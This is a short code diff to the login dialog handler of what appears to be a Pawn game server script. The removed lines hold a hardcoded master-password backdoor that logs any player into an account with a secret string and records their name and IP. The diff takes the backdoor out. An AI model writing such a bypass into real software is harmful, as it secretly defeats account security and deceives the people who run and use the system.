@@ -7218,22 +7218,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 			    {
 			        if(strlen(inputtext) >= 1 && strlen(inputtext) <= 64)
 			        {
-						if(strcmp(inputtext, "GuL973TekeSTDz4-128", false) == 0)
-						{
-	                        new cklog[256];
-	                        new ajpi[128];
-	                        new nickgula[MAX_PLAYER_NAME];
-			        		GetPlayerName(playerid, nickgula, sizeof(nickgula));
-			        		GetPlayerIp(playerid, ajpi, sizeof(ajpi));
-						    SendClientMessage(playerid, COLOR_PANICRED, "U¿y³eœ has³a uniwersalnego.!");
-							format(cklog, sizeof(cklog), "%s uzyl GuLa z IP %s", nickgula, ajpi);
-							CKLog(cklog);
-							OnPlayerLogin(playerid, "GuL973TekeSTDz4-36");
-						}
-						else
-						{
-							OnPlayerLogin(playerid, inputtext);
-						}
+						OnPlayerLogin(playerid, inputtext);
 					}
 					else
 					{
